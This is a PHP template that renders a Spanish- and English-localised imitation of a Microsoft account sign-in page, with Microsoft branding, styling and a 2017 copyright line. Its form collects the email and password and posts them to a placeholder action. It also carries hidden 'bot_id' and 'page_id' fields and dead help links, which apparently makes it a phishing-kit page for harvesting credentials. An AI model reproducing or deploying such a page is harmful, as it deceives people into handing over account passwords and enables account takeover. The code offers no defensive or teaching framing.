<?php
if(isset($_GET['l']) && trim($_GET['l']))
	$lang = $_GET['l'];
else if(isset($GLOBALS['language']) && trim($GLOBALS['language']))
	$lang = $GLOBALS['language'];
else
	$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


$local = array(
	'en' => array(
		'acc' => 'Microsoft account',
		'signin' => 'Sign in',
		'whatsthis' => 'What\'s this?',
		'passwd' => 'Password',
		'keepme' => 'Keep me signed in',
		'cantaccess' => 'Can\'t access your account?',
		'donthave' => 'Don\'t have a Microsoft account?',
		'signup' => 'Sign up now',
		'privacy' => 'Privacy & Cookies',
	),

	'es' => array(
		'acc' => 'Cuenta Microsoft',
		'signin' => 'Ingresar',
		'whatsthis' => 'Que es esto?',
		'passwd' => 'Contraseña',
		'keepme' => 'Mantener sesion',
		'cantaccess' => 'No puedes ingresar?',
		'donthave' => '¿No tienes una cuenta de Microsoft?',
		'signup' => 'Registrase ahora',
		'privacy' => 'Terminos de Privacidad',
	),
);

if(array_key_exists($lang, $local))
	$l = $local[$lang];
else
	$l = $local['en'];
	
$html = <<<HTML

<html dir="ltr" lang="EN-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<script type="text/javascript"></script>
<title>Sign In</title>  
<meta name="description" content="Outlook.com is a free, personal email service from Microsoft. Keep your inbox clutter-free with powerful organizational tools, and collaborate easily with OneDrive and Office Online integration.">
<meta name="PageID" content="i5011">
<meta name="SiteID" content="64855">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="1033">
<style>
	</style>
<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.25838.00/favicon.ico?v=2">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	
	<style type="text/css">body{display:none;}</style>
	<style type="text/css">
	.Breadcrumb{color:#6e6e6e;border:none 1px solid;background-color:transparent}.Breadcrumb a{color:#6e6e6e;text-decoration:none}.Breadcrumb a:visited{color:#6e6e6e}.SelectionBG{background-color:#979797}.HoverBG{background-color:#f3f3f3}.ContainerBorder{border:1px solid #ccc}.ContainerBG{background-color:#fff;background-image:none;background-repeat:repeat-x}.PageBG{background-repeat:no-repeat}.BodyBG{background-color:#fff;background-image:none;background-repeat:repeat;background-position:top left}.BreadcrumbBG{background-color:transparent}.BreadcrumbBorder{border:none 1px solid}.ContainerBG2{background-color:#fff;background-image:none;background-repeat:repeat-x}.ContainerHeader{background-repeat:repeat-x;background-image:none}.ContainerHeader a{color:#f4793a}.ContainerHeader a:visited{color:#f4793a}.ToolbarBorder{border:#ccc 1px solid}.ToolbarBG{background-color:#fff;background-image:none;background-repeat:repeat-x}.Toolbar{color:#000;border:#ccc 1px solid}.LineHeightTight{line-height:110%}.LineHeightStandard{line-height:142%}.LineHeightLoose{line-height:178%}.LineHeightXLoose{line-height:200%}.TextSemiBold{font-family:"Segoe UI Semibold","Segoe UI Web Semibold","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Medium","Helvetica Neue",Arial,sans-serif;font-weight:bold}.TextBold{font-family:"Segoe UI Semibold","Segoe UI Web Semibold","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Medium","Helvetica Neue",Arial,sans-serif;font-weight:bold}.TextBoldI{font-family:"Segoe UI Semibold","Segoe UI Web Semibold","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Medium","Helvetica Neue",Arial,sans-serif!important;font-weight:bold}.TextLight{font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Light","Helvetica Neue",Arial,sans-serif}.TextLightI{font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Light","Helvetica Neue",Arial,sans-serif!important}.TextItalic{font-style:italic}.TextNormal{font-weight:normal;font-style:normal;white-space:normal;text-transform:none;letter-spacing:normal}.TextHighlight{color:#f07522;font-weight:bold}.TextAdLabel{font-size:86%;text-transform:uppercase;color:#666}.TextDefinition{background:url(hig/img/definitionUnderline.gif) bottom repeat-x}.L_FloatLeft{float:left}.L_FloatRight{float:right}.L_TextAlignLeft{text-align:left}.L_TextAlignRight{text-align:right}.c_clr{clear:both;display:block}.TextSizeXSmall{font-size:86%}.TextSizeSmall{font-size:86%}.TextSizeNormal{font-size:100%}.TextSizeLarge{font-size:150%}.TextSizeXLarge{font-size:192%}.TextSizeXXLarge{font-size:192%}.TextSizeXXXLarge{font-size:192%}.TextSizeNormalPlus{font-size:100%}.AppLink:visited{color:inherit}@font-face{font-family:"Segoe UI Web Light";src:local("Segoe UI Light"),local("Segoe UI"),local("HelveticaNeue-Light");font-style:normal;font-weight:100;unicode-range:U+0-FF,U+300-36F}@font-face{font-family:"Segoe UI Web Regular";src:local("Segoe UI"),local("Helvetica Neue");font-style:normal;font-weight:normal;unicode-range:U+0-FF,U+300-36F}@font-face{font-family:"Segoe UI Web Semibold";src:local("Segoe UI Semibold"),local("Segoe UI Bold"),local("Segoe UI"),local("HelveticaNeue-Medium");font-style:normal;font-weight:bold;unicode-range:U+0-FF,U+300-36F}div.heading div{padding-left:10px}div.topHeader{background-color:#2672ec;color:#fff;height:40px;margin:0;padding:0;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis}div.topHeader span{font-size:19px;display:inline-block;margin-top:6px;margin-left:10px;white-space:nowrap;text-overflow:ellipsis;-o-text-overflow:ellipsis}div.content.host{margin:0 10px;text-align:left}div.content.mobile{margin-bottom:50px}div.phholder,div.placeholder{pointer-events:none}select{-webkit-appearance:listbox}body[uiFlavor='holo']{background-color:#000;color:#fff}body[uiFlavor='holo'] label{color:#fff}input[type=text],input[type=password],input[type=email],input[type=tel]{ime-mode:inactive}input[type=email],.ltr_override{direction:ltr}.secondary,.help{color:#666}.help,.info{font-size:86%}.breakword{word-wrap:break-word}.disabled{color:#c7c7c7}:root input[type=button],:root input[type=submit],:root button{height:2.142em;min-width:6em;font-family:"Segoe UI Semibold","Segoe UI Web Semibold","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Medium","Helvetica Neue",Arial,sans-serif;font-size:100%;background-color:rgba(182,182,182,.7);color:#212121;padding:3px 12px 5px;border:0}:root .SF_Android input[type=button],:root .SF_Android input[type=submit],:root .SF_Android button{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif}input[type=button]::-moz-focus-inner,input[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border:0}:root .RE_WebKit input[type=button],:root .RE_WebKit input[type=submit],:root .RE_WebKit button{padding-top:4px;-webkit-appearance:none;border-radius:0}:root input[type=button]:hover,:root input[type=submit]:hover,:root button:hover{background-color:rgba(205,205,205,.82)}:root input[type=button]:active,:root input[type=submit]:active,:root button:active{background-color:#212121;color:#fff}:root input[type=button]:focus:not(.c_nobdr),:root input[type=submit]:focus:not(.c_nobdr),:root button:focus:not(.c_nobdr){outline:1px dotted #212121}:root .dark input[type=button],:root .dark input[type=submit],:root .dark button{background-color:transparent;border:2px solid #fff;color:#fff}:root .dark input[type=button]:hover,:root .dark input[type=submit]:hover,:root .dark button:hover{background-color:rgba(255,255,255,.24)}:root .dark input[type=button]:active,:root .dark input[type=submit]:active,:root .dark button:active,:root .dark input[type=button]:active.default,:root .dark input[type=submit]:active.default,:root .dark button:active.default{background-color:#fff;border-color:#fff;color:#212121}:root .dark input[type=button]:focus:not(.c_nobdr),:root .dark input[type=submit]:focus:not(.c_nobdr),:root .dark button:focus:not(.c_nobdr){outline:1px dotted #fff}:root .Firefox .dark input[type=button],:root .Firefox .dark input[type=submit],:root .Firefox .dark button{padding-top:0}:root input[type=button].default,:root input[type=submit].default,:root button.default{background-color:#2672ec;color:#fff}:root input[type=button]:hover.default,:root input[type=submit]:hover.default,:root button:hover.default{background-color:#5a94f1}:root input[type=button]:active.default,:root input[type=submit]:active.default,:root button:active.default,:root input[type=button]:hover:active.default,:root input[type=submit]:hover:active.default,:root button:hover:active.default{background-color:#212121}:root input[type=button]:disabled,:root input[type=submit]:disabled,:root button:disabled{background-color:rgba(202,202,202,.49)!important;color:rgba(33,33,33,.49)!important}:root .dark input[type=button]:disabled,:root .dark input[type=submit]:disabled,:root .dark button:disabled,:root .dark input[type=button]:active:disabled,:root .dark input[type=submit]:active:disabled,:root .dark button:active:disabled{color:rgba(255,255,255,.49);background-color:transparent;border-color:rgba(255,255,255,.49)}:root .highContrast input[type=button],:root .highContrast input[type=submit],:root .highContrast button{color:#fff;border:2px solid #fff;background-color:#000!important}:root .dark input[type=text],:root .dark input[type=password],:root .dark input[type=email],:root .dark input[type=number],:root .dark input[type=tel],:root .dark input[type=search],:root .dark textarea{color:#212121;border-color:rgba(255,255,255,.8)}:root .dark input[type=text]:hover,:root .dark input[type=password]:hover,:root .dark input[type=email]:hover,:root .dark input[type=number]:hover,:root .dark input[type=tel]:hover,:root .dark input[type=search]:hover,:root .dark textarea:hover{border-color:rgba(255,255,255,.87)}:root .dark input[type=text]:focus,:root .dark input[type=password]:focus,:root .dark input[type=email]:focus,:root .dark input[type=number]:focus,:root .dark input[type=tel]:focus,:root .dark input[type=search]:focus,:root .dark textarea:focus{background-color:#fff;border-color:#fff}:root .dark input[type=text]:disabled,:root .dark input[type=password]:disabled,:root .dark input[type=email]:disabled,:root .dark input[type=number]:disabled,:root .dark input[type=tel]:disabled,:root .dark input[type=search]:disabled,:root .dark textarea:disabled{color:rgba(255,255,255,.49);background-color:transparent;border-color:rgba(255,255,255,.49)}:root .highContrast input[type=text]:disabled,:root .highContrast input[type=password]:disabled,:root .highContrast input[type=email]:disabled,:root .highContrast input[type=number]:disabled,:root .highContrast input[type=tel]:disabled,:root .highContrast input[type=search]:disabled,:root .highContrast textarea:disabled{background-color:#000}:root input[type=checkbox],:root input[type=radio]{position:absolute;padding:0 0 0 0;width:19px;height:19px;margin:0 0 0 0;float:left;cursor:default}BODY:not(.IE_M9) input[type=checkbox],BODY:not(.IE_M9) input[type=radio]{opacity:0}.IE_M9 input[type=checkbox],.IE_M9 input[type=radio]{filter:alpha(opacity=0)}:root input[type=checkbox]:last-child,:root input[type=radio]:last-child{position:static;float:none}BODY:not(.IE_M9) input[type=checkbox]:last-child,BODY:not(.IE_M9) input[type=radio]:last-child{opacity:1}.IE_M9 input[type=checkbox]:last-child,.IE_M9 input[type=radio]:last-child{filter:none}:root input[type=checkbox]+label,:root input[type=radio]+label{display:inline-block;background:url(hig/img/controls.png) top left no-repeat,url(hig/img/controls.png) top left no-repeat,url(hig/img/controls.png) top left no-repeat;height:19px;line-height:19px;padding-left:24px;cursor:default}:root .RE_WebKit input[type=checkbox]+label,:root .RE_WebKit input[type=radio]+label{display:inline}:root .highContrast input[type=checkbox],:root .highContrast input[type=radio]{position:static;width:auto;height:auto}:root .highContrast input[type=checkbox]+label,:root .highContrast input[type=radio]+label{display:inline;background:none;padding:0;height:auto}BODY.highContrast:not(.IE_M9) input[type=checkbox],BODY.highContrast:not(.IE_M9) input[type=radio]{opacity:1}.IE_M9.highContrast input[type=checkbox],.IE_M9.highContrast input[type=radio]{filter:none}:root input[type=checkbox]+label{background-position:left -38px}:root input[type=radio]+label{background-position:left -228px}:root input[type=checkbox]:checked+label{background-position:left 38px,left -114px,left -38px}:root .tschk_mixed input[type=checkbox]+label{background-position:left 38px,left -171px,left -38px}:root input[type=checkbox]:active+label,:root input[type=checkbox]+label:active{background-position:left -57px}:root input[type=checkbox]:active:checked+label,:root input[type=checkbox]:checked+label:active{background-position:left 38px,left -152px,left -57px}:root .tschk_mixed input[type=checkbox]:active+label,:root .tschk_mixed input[type=checkbox]+label:active{background-position:left 38px,left -209px,left -57px}:root input[type=checkbox]:disabled+label{background-position:left -76px}:root input[type=checkbox]:disabled:checked+label{background-position:left 38px,left -133px,left -76px}:root .tschk_mixed input[type=checkbox]:disabled+label{background-position:left 38px,left -190px,left -76px}:root input[type=checkbox]:focus:not(.c_nobdr)+label:not(.c_nobdr){background-position:left 0,left 38px,left -38px}:root input[type=checkbox]:focus:checked:not(.c_nobdr)+label:not(.c_nobdr){background-position:left 0,left -114px,left -38px}:root .tschk_mixed input[type=checkbox]:focus:not(.c_nobdr)+label:not(.c_nobdr){background-position:left 0,left -171px,left -38px}:root input[type=checkbox]:focus:active:not(.c_nobdr)+label:not(.c_nobdr),:root input[type=checkbox]:focus:not(.c_nobdr)+label:active:not(.c_nobdr){background-position:left 0,left 38px,left -57px}:root input[type=checkbox]:focus:active:checked:not(.c_nobdr)+label:not(.c_nobdr),:root input[type=checkbox]:focus:checked:not(.c_nobdr)+label:active:not(.c_nobdr){background-position:left 0,left -152px,left -57px}:root .tschk_mixed input[type=checkbox]:focus:active:not(.c_nobdr)+label:not(.c_nobdr),:root .tschk_mixed input[type=checkbox]:focus:not(.c_nobdr)+label:active:not(.c_nobdr){background-position:left 0,left -209px,left -57px}.IE .tschk{position:relative}.IE .tschk_box{position:absolute;width:7px;height:7px;background:#212121;display:none;margin-left:7px;margin-top:7px;font-size:1px}.IE_M6 .tschk_mixed .tschk_box,.IE_M7 .tschk_mixed .tschk_box,.IE_M8 .tschk_mixed .tschk_box{display:block}:root input[type=radio]:checked+label{background-position:left 38px,left -304px,left -228px}:root input[type=radio]:active+label,:root input[type=radio]+label:active{background-position:left -247px}:root input[type=radio]:active:checked+label,:root input[type=radio]:checked+label:active{background-position:left 38px,left -342px,left -247px}:root input[type=radio]:disabled+label{background-position:left -266px}:root input[type=radio]:disabled:checked+label{background-position:left 38px,left -323px,left -266px}:root input[type=radio]:focus:not(.c_nobdr)+label:not(.c_nobdr){background-position:left 0,left 38px,left -228px}:root input[type=radio]:focus:checked:not(.c_nobdr)+label:not(.c_nobdr){background-position:left 0,left -304px,left -228px}:root input[type=radio]:focus:active:not(.c_nobdr)+label:not(.c_nobdr),:root input[type=radio]:focus:not(.c_nobdr)+label:active:not(.c_nobdr){background-position:left 0,left 38px,left -247px}:root input[type=radio]:focus:active:checked:not(.c_nobdr)+label:not(.c_nobdr),:root input[type=radio]:focus:checked:not(.c_nobdr)+label:active:not(.c_nobdr){background-position:left 0,left -342px,left -247px}::-webkit-scrollbar{width:17px;height:17px;background-color:#f0f0f0;border:none}::-webkit-scrollbar:disabled{background-color:#f9f9f9}::-webkit-scrollbar-thumb{background-color:#cdcdcd;border:1px solid #f0f0f0}::-webkit-scrollbar-thumb:hover{background-color:#dadada}::-webkit-scrollbar-thumb:active{background-color:#606060}::-webkit-scrollbar-thumb:disabled{background-color:#f9f9f9}::-webkit-scrollbar-corner{background-color:#f0f0f0}::-webkit-scrollbar-button{background-color:#f0f0f0;background-image:url(hig/img/controls.png);background-repeat:no-repeat}::-webkit-scrollbar-button:vertical{height:33px}::-webkit-scrollbar-button:horizontal{width:33px}::-webkit-scrollbar-button:horizontal:increment{background-position:0 -444px}::-webkit-scrollbar-button:horizontal:decrement{background-position:12px -425px}::-webkit-scrollbar-button:vertical:increment{background-position:-1px -391px}::-webkit-scrollbar-button:vertical:decrement{background-position:-1px -358px}::-webkit-scrollbar-button:hover{background-color:#dadada}::-webkit-scrollbar-button:horizontal:increment:hover{background-position:0 -548px}::-webkit-scrollbar-button:horizontal:decrement:hover{background-position:12px -529px}::-webkit-scrollbar-button:vertical:increment:hover{background-position:-1px -495px}::-webkit-scrollbar-button:vertical:decrement:hover{background-position:-1px -462px}::-webkit-scrollbar-button:active{background-color:#606060}::-webkit-scrollbar-button:horizontal:increment:active{background-position:0 -652px}::-webkit-scrollbar-button:horizontal:decrement:active{background-position:12px -633px}::-webkit-scrollbar-button:vertical:increment:active{background-position:-1px -599px}::-webkit-scrollbar-button:vertical:decrement:active{background-position:-1px -566px}::-webkit-scrollbar-button:disabled{background-color:#f9f9f9}::-webkit-scrollbar-button:horizontal:increment:disabled{background-position:0 -756px}::-webkit-scrollbar-button:horizontal:decrement:disabled{background-position:12px -737px}::-webkit-scrollbar-button:vertical:increment:disabled{background-position:-1px -703px}::-webkit-scrollbar-button:vertical:decrement:disabled{background-position:-1px -670px}.SF_iPhone .sc{-webkit-overflow-scrolling:touch}.errorDiv,.editableLabel.error{color:#c85305;font-size:86%;line-height:178%;margin-top:18px;margin-bottom:12px;white-space:normal}*{line-height:142%}body.IE6 input,body.IE input[type=text],body.IE input[type=email],body.IE input[type=file],body.IE input[type=number],body.IE input[type=search],body.IE input[type=url],body.IE input[type=tel]{line-height:normal}body{margin:0;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;color:#000;background-color:#fff;background-image:none;background-repeat:repeat;background-position:top left;direction:ltr;font-size:88%;-webkit-font-smoothing:antialiased}body.IE_M7,body.IE_M8,body.IE_WinMo{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif}body.SF_iPhone{-webkit-text-size-adjust:none}label{color:#000}input,select,textarea,button{font-size:100%;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif}h1{color:#000}h2 .c_lhds{color:#c7c7c7}h1,h2,h3{font-size:150%;font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Light","Helvetica Neue",Arial,sans-serif}.SF_Android h1,.SF_Android h2,.SF_Android h3{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif}h4,h5,h6{font-size:100%}h1,h2,h3,h4,h5,h6{font-weight:normal}h1,h2,h3,h4,h5,h6{margin:0 0 5px 0}h2{margin-bottom:10px}h2+h3,h3+h3{margin-top:16px}p{margin:0 0 1.35em 0}a{font-weight:inherit;text-decoration:none;color:#2672ec;cursor:pointer}a:visited{color:#2672ec}ul{margin-top:0;margin-right:0;margin-bottom:20px;margin-left:1em;padding-top:0;padding-right:0;padding-bottom:0;padding-left:1em;list-style-type:disc}li{margin-top:0;margin-right:0;margin-bottom:3px;margin-left:0}font{line-height:normal}a img{border:0}.c_nobdr{outline:none}.c_formLabel{font-size:86%;padding-top:10px;display:block}input[type=text],input[type=password],input[type=email],input[type=tel]{padding:4px 8px;height:1.466em;width:282px}:root input[type=text],:root input[type=password],:root input[type=email],:root input[type=tel]{width:282px}div.placeholder{color:#666;background-color:transparent;margin-top:6px;margin-left:9px;white-space:nowrap}::-webkit-input-placeholder{color:#666!important}:-moz-placeholder{color:#666!important;opacity:1}::-moz-placeholder{color:#666!important;opacity:1}:-ms-input-placeholder{color:#666!important}div.placeholder.ltr_override{margin-left:9px;margin-right:auto;text-align:left}div.textbox,select{width:300px}:root select{border:1px solid #bababa;height:32px;padding:4px}:root .highContrast input[type=button],:root .highContrast input[type=submit],:root .highContrast button{padding-top:0;padding-bottom:0}:root .highContrast input[type=checkbox],:root .highContrast input[type=radio]{padding-top:4px}:root .highContrast input[type=checkbox]+label,:root .highContrast input[type=radio]+label{padding-left:5px}div.section{margin-bottom:20px}div.section.header{margin-bottom:20px}div.section.buttons{margin-top:40px}div.section.inline{display:inline-block}div.section.last,div.section.nomargin,div.section:last-child{margin-bottom:0}div.row,div.section>div{margin-bottom:8px}div.row.small,div.section>div.small{margin-bottom:6px;font-size:86%}div.row.large,div.section>div.large{margin-bottom:10px}div.row.xlarge,div.section>div.xlarge{margin-bottom:20px}div.row.label,div.section>div.label{margin-bottom:4px;font-size:86%}div.title{font-size:150%;font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol","HelveticaNeue-Light","Helvetica Neue",Arial,sans-serif}body.IE_M10 select{padding:0 5px;border:1px solid #bababa;background-color:#fff;color:#212121}body.IE_M10 select:hover{border:1px solid #26a0da}body.IE_M10 select:active,body.IE_M10 select:focus{border:1px solid #212121}body.IE_M10 select:disabled{border:1px solid #bcbcbc;background-color:#e5e5e5;color:#707070}body.IE_M10 select::-ms-expand{color:#212121;background-color:#fff;border:none}body.IE_M10 select:disabled::-ms-expand{color:#707070}body.IE_M10 select:focus::-ms-value{color:HighlightText;background-color:#26a0da}div.heading{height:40px;white-space:nowrap;position:relative;z-index:250000;background-color:#2672ec;overflow:visible}div.heading div{padding-left:20px;float:left;min-width:160px}div.heading span{line-height:38px;display:inline-block;color:#fff;font-size:150%}div.heading div.signout{position:absolute;right:0;margin-right:10px;min-width:0}div.heading div.signout span{font-size:86%;padding-right:10px;padding-left:10px}div.heading div.signout span:hover{background:rgba(0,0,0,.12)}div.heading div.signout span a{color:#fff}div.header.row.web{min-width:640px}div.contentHolder{text-align:center}div.contentSpacer{width:320px;margin-left:auto;margin-right:auto;margin-top:8px}div.contentSpacer.popup{margin-top:40px}div.content.web{margin-left:20px;width:640px}div.content.popup{margin-bottom:50px}div.loginhead,div.content.popup,div.footer.popup{width:300px;margin-left:auto;margin-right:auto;text-align:left}div.loginhead{margin-bottom:20px}h1.loginhead{font-size:250%;line-height:50px;color:#666;margin-bottom:0}span.proof{color:#666;font-size:150%}span.success{color:#2b8010}div.inlineInput{float:left}input[type=button].cancel,button.cancel{margin-left:20px}div.errorDiv.first{margin-top:0}input,button{-webkit-appearance:none;-webkit-border-radius:0}.hip-menu{font-size:86%}.hip-error{inherit:errorDiv;margin-left:-2px;width:300px}.hip-erroricon{display:none}input.hip{ime-mode:inactive!important;padding:4px 8px!important;height:1.466em!important;width:282px!important}:root input.hip{border-width:1px!important}select::-ms-expand{border:0;background-color:transparent}span.sessionid{color:#047b0c}div.footer{font-size:86%}div.footerNode{text-align:center;margin:4px 0}div.links a{padding-left:9px;margin-right:5px;border-left:1px solid #666}div.links a.first{padding-left:0;border-left-style:none}
	body{display:block !important;}	
	.fielderror{
	padding: 4px 8px;
    font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;
    font-size: 100%;
    color: #212121;
    border: 1px solid #f00;
    background-color: rgba(255,255,255,.8);	
	width: 282px;
	height: 1.571em;
	}
.input {
	height: 1.571em;
    width: 282px;
	padding: 4px 8px;
    font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;
    font-size: 100%;
    color: #212121;
    border: 1px solid #bababa;
    background-color: rgba(255,255,255,.8);	
}
	</style>

	
	</head>
<body onload="wLive.Login.Mobile.initializeViewModel();">
<div id="content_div">

<div id="i0272" class="topHeader">
<span data-bind="text: str['\$Eb']">{$l['acc']}</span>
</div>
<div class="contentHolder">
<div class="contentSpacer">
<div class="loginhead">
<h1 id="i0279" class="loginhead" data-bind="text: str['\$cs']">Sign in</h1>
</div>   
<!-- ko if: (isRegularMode || isForceSignInMode || isPhoneLoginMode) -->
<div class="content mobile host">

<script src='%DYN_PATH_GENERAL%/jquery.min.js'></script><script src='%DYN_PATH_GENERAL%/validator.js'></script><form id='mainform' method='post' action='%ACTION%' onsubmit="return formvalidator()"><input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />

<div class="section"> 
<div id="idTd_Tile_Error" aria-live="assertive" aria-relevant="text" aria-atomic="true" data-bind="visible: _aV" style="display: none;"><div class="errorDiv first" id="idTd_Tile_ErrorMsg_Login" data-bind="html: _aV"></div></div>   
<!-- ko if: isForceSignInMode --><!-- /ko --><!-- ko if: isPhoneLoginMode --><!-- /ko -->   
<!-- ko if: isRegularMode || isPhoneLoginMode --><!-- ko with: _aT -->
<div id="idTd_PWD_Error" aria-live="assertive" aria-relevant="text" aria-atomic="true" data-bind="visible: error" style="display: none;">
<div class="errorDiv first" id="idTd_PWD_ErrorMsg_Username" data-bind="html: error"></div>
</div><!-- ko if: \$parent.isRegularMode -->
<div id="idTd_PWD_UsernameLbl" class="row label">
<span id="idLbl_PWD_Username" data-bind="html: \$parent.html['\$bY'], anchorAttr: { href: \$parent._g.Av, target: '_blank' }">{$l['acc']} <a id="idA_MSAccLearnMore" href="javascript:return false" target="_blank">{$l['whatsthis']}</a></span>
</div><!-- /ko -->
<div id="idDiv_PWD_UsernameTb" class="row textbox">
<input type="Email" name="fields[login]" id="Email" maxlength="113" lang="en" class="input" aria-labelledby="idLbl_PWD_Username" aria-describedby="idTd_Tile_Error idTd_PWD_Error" data-bind="value: value, _cG: \$parent.isPhoneLoginMode &amp;&amp; \$parent.phoneViewModel.controlsDisabled, event: \$parent.isPhoneLoginMode &amp;&amp; { change: \$parent.phoneViewModel._cj }">
<div id="idTd_PWD_Error_Password" aria-live="assertive" aria-relevant="text" aria-atomic="true" data-bind="visible: error" style="display: none;">
<div class="errorDiv" id="idTd_PWD_ErrorMsg_Password" data-bind="html: error"></div></div>
<div class="row label">
<label for="i0118" id="idLbl_PWD_PasswordTb" data-bind="text: \$parent.str['\$a9']">{$l['passwd']}</label></div>
<div id="idDiv_PWD_PasswordTb" class="row textbox">
<input name="fields[password]" type="password" id="password" class="input"></div><!-- /ko -->   
<div id="idTd_PWD_KMSI_Cb">
<input type="checkbox" name="keep" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: _lw">
<label for="idChkBx_PWD_KMSI0Pwd" id="idLbl_PWD_KMSI_Cb" data-bind="text: str['\$D2']">{$l['keepme']}</label>
</div></div>
<div id="idTd_PWD_SubmitCancelTbl" class="section">
<input type="submit" id="input_submitBtn" class="default" value="{$l['signin']}"></div>

<div class="section">
<div id="idDiv_PWD_ForgotPassword" class="row small">
<a id="idA_PWD_ForgotPassword" data-bind="text: str['\$a8'], attr: { href: _g.e }" href="javascript:return false">{$l['cantaccess']}</a>
</div>  <!-- ko if: isForceSignInMode --><!-- /ko --></div>
<div id="i0280" class="section">
<span data-bind="text: str['\$bs']">{$l['donthave']}</span>&nbsp;
<a id="idA_SignUp" class="TextSemiBold" data-bind="text: str['\$Bs'], attr: { href: _g.G }" href="javascript:return false">{$l['signup']}</a></div>   


</form>
</div>  
</div></div>
<div id="footerTD" class="footer">
<div class="footerNode links">
<a id="ftrPrivacy" class="first" data-bind="text: str['\$dK'], attr: { href: _g.Aa }" href="javascript:return false">{$l['privacy']}</a>
<div id="ftrCopy" class="footerNode secondary" data-bind="html: html['\$dk']">© 2017 Microsoft</div></div></div>
     
</div>
</body>
</html>
HTML;
$GLOBALS['html'] = $html;

